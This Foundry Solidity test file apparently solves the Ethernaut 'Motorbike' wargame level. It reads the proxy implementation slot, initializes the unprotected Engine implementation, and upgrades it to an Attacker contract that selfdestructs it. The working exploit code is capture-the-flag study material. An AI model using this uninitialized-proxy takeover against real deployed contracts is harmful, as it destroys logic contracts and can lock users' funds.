// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Motorbike, Engine, Address} from "~/Motorbike.sol";
import {Attacker} from "~/helpers/Motorbike.sol";

contract MotorbikeTest is Test {
    Motorbike target;
    Engine engine;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 10 ether);

        engine = new Engine();
        target = new Motorbike(address(engine));

        // NOTE: attack in `setUp` for this case, see details under `testAttack`
        vm.startPrank(player);
        attack();
        vm.stopPrank();
    }

    function attack() private {
        // internal implementation slot from the contract
        bytes32 addrByte = vm.load(address(target), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        Engine engineImpl = Engine(address(uint160(uint256(addrByte))));

        // the engine is not actually initialized, lets do that!
        engineImpl.initialize();

        // deploy new initialization i.e. our attacker
        Attacker attacker = new Attacker();
        engineImpl.upgradeToAndCall(address(attacker), abi.encodePacked(Attacker.pwn.selector));
    }

    function testAttack() public {
        // NOTE: just an exception for this test, we are making the
        // attack within the `setUp` instead of `testAttack`
        //
        // this is because `selfdestruct` only activates at the end of a call,
        // which means we cant see its result in a single test; however, it works
        // if you do it in a setUp instead.
        //
        // see: https://github.com/foundry-rs/foundry/issues/1543

        assertFalse(Address.isContract(address(engine)), "engine must be self-destructed");
    }
}
